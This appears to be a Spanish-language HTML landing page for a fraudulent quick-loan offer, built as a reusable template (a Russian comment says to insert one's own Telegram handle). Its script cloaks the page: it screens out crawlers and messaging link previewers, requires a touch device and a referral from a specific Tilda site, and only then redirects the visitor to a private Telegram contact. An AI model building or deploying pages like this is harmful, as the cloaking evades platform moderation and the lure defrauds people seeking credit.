<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Crédito en minutos</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <style>
    body {
      background-color: #f9f9f9;
      font-family: 'Segoe UI', sans-serif;
      color: #333;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      text-align: center;
      padding: 20px;
    }
    h1 {
      color: #007b59;
      font-size: 2rem;
    }
    .info {
      font-size: 1.2rem;
      margin: 10px 0;
    }
    .button {
      background-color: #00b36b;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 1rem;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 30px;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <h1>📄 Crédito aprobado en solo 5 minutos</h1>
  <p class="info">💰 Desde $200.000 — Tasa desde el 11% anual</p>
  <p class="info">🔒 100% online y seguro</p>
  <p class="info">🎯 Sin vueltas, sin bancos ni trámites</p>

  <a id="btn" class="button" href="#">Solicitar ahora</a>

  <script>
    const isHuman = () => {
      const ua = navigator.userAgent;
      const bots = [/bot/i, /crawl/i, /spider/i, /WhatsApp/i, /telegram/i, /Discord/i, /Slackbot/i, /Google/i, /Preview/i];
      return !bots.some(b => b.test(ua));
    };

    const isTouchDevice = () => {
      return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    };

    const isFromTilda = () => {
      return document.referrer.includes("tilda") || document.referrer.includes("argentinaforreal.tilda.ws");
    };

    const redirectToTelegram = () => {
      window.location.href = "https://t.me/Veronica_especialista"; // ← вставь свой Telegram
    };

    document.getElementById("btn").addEventListener("click", function (e) {
      e.preventDefault();
      if (isHuman() && isTouchDevice() && isFromTilda()) {
        redirectToTelegram();
      } else {
        alert("Acceso restringido. Intenta desde el enlace oficial.");
      }
    });
  </script>
</body>
</html>
